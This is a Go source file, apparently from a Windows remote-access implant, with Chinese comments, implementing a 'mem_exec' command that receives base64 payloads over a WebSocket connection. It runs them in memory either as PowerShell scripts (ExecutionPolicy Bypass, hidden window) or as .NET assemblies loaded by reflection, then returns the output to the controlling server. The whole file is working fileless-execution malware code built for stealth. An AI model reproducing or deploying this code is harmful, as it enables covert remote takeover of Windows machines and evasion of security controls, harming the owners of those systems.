//go:build windows

package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"log"
	"os/exec"
	"sync"
	"syscall"

	"github.com/gorilla/websocket"
)

// ═══ mem_exec: 服务端通过 WebSocket 推送代码到 agent 内存执行 ═══
// 支持两种模式：
//   - ps1: PowerShell 脚本内存执行（通过 -EncodedCommand）
//   - dotnet: .NET Assembly 通过 PowerShell [Reflection.Assembly]::Load() 内存加载

type MemExecRequest struct {
	Mode    string `json:"mode"`    // "ps1" 或 "dotnet"
	Code    string `json:"code"`    // base64 编码的载荷
	Timeout int    `json:"timeout"` // 超时秒数（默认 30）
}

// handleMemExec 处理 mem_exec 指令
func handleMemExec(conn *websocket.Conn, writeMu *sync.Mutex, msg AgentMessage) {
	var req MemExecRequest
	if err := json.Unmarshal(msg.Payload, &req); err != nil {
		sendMemExecResult(conn, writeMu, msg.ID, "", fmt.Sprintf("解析失败: %v", err))
		return
	}

	if req.Timeout <= 0 {
		req.Timeout = 30
	}

	switch req.Mode {
	case "ps1":
		handleMemExecPS1(conn, writeMu, msg.ID, req)
	case "dotnet":
		handleMemExecDotNet(conn, writeMu, msg.ID, req)
	default:
		sendMemExecResult(conn, writeMu, msg.ID, "", "不支持的模式: "+req.Mode)
	}
}

// handleMemExecPS1 PowerShell 内存执行
func handleMemExecPS1(conn *websocket.Conn, writeMu *sync.Mutex, id string, req MemExecRequest) {
	// Code 是 base64 编码的 PS1 脚本明文
	scriptBytes, err := base64.StdEncoding.DecodeString(req.Code)
	if err != nil {
		sendMemExecResult(conn, writeMu, id, "", "base64 解码失败")
		return
	}

	// 转为 UTF-16LE 后再 base64（PowerShell -EncodedCommand 格式）
	encodedCmd := encodePS(string(scriptBytes))

	cmd := exec.Command("powershell.exe",
		"-ExecutionPolicy", "Bypass",
		"-NoProfile", "-NonInteractive",
		"-WindowStyle", "Hidden",
		"-EncodedCommand", encodedCmd,
	)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: 0x08000000}

	out, err := cmd.CombinedOutput()
	errMsg := ""
	if err != nil {
		errMsg = err.Error()
	}
	sendMemExecResult(conn, writeMu, id, string(out), errMsg)
}

// handleMemExecDotNet .NET Assembly 内存加载执行
func handleMemExecDotNet(conn *websocket.Conn, writeMu *sync.Mutex, id string, req MemExecRequest) {
	// Code 是 base64 编码的 .NET DLL/EXE 字节
	// 通过 PowerShell [Reflection.Assembly]::Load() 加载并调用入口点
	psScript := fmt.Sprintf(`
$bytes = [Convert]::FromBase64String('%s')
$asm = [Reflection.Assembly]::Load($bytes)
$entry = $asm.EntryPoint
if ($entry) {
    $entry.Invoke($null, @(,@()))
} else {
    $types = $asm.GetExportedTypes()
    foreach ($t in $types) {
        $main = $t.GetMethod('Run', [Reflection.BindingFlags]'Public,Static')
        if ($main) { $main.Invoke($null, $null); break }
    }
}
`, req.Code)

	encodedCmd := encodePS(psScript)

	cmd := exec.Command("powershell.exe",
		"-ExecutionPolicy", "Bypass",
		"-NoProfile", "-NonInteractive",
		"-WindowStyle", "Hidden",
		"-EncodedCommand", encodedCmd,
	)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: 0x08000000}

	out, err := cmd.CombinedOutput()
	errMsg := ""
	if err != nil {
		errMsg = err.Error()
	}
	sendMemExecResult(conn, writeMu, id, string(out), errMsg)
}

func sendMemExecResult(conn *websocket.Conn, writeMu *sync.Mutex, id, output, errMsg string) {
	result := map[string]interface{}{
		"output": output,
		"error":  errMsg,
	}
	payload, _ := json.Marshal(result)
	resp, _ := json.Marshal(AgentMessage{
		Type:    c2e("mem_exec_result"),
		ID:      id,
		Payload: payload,
	})
	writeMu.Lock()
	defer writeMu.Unlock()
	if err := conn.WriteMessage(websocket.TextMessage, resp); err != nil {
		log.Printf("[mem_exec] 发送结果失败: %v", err)
	}
}
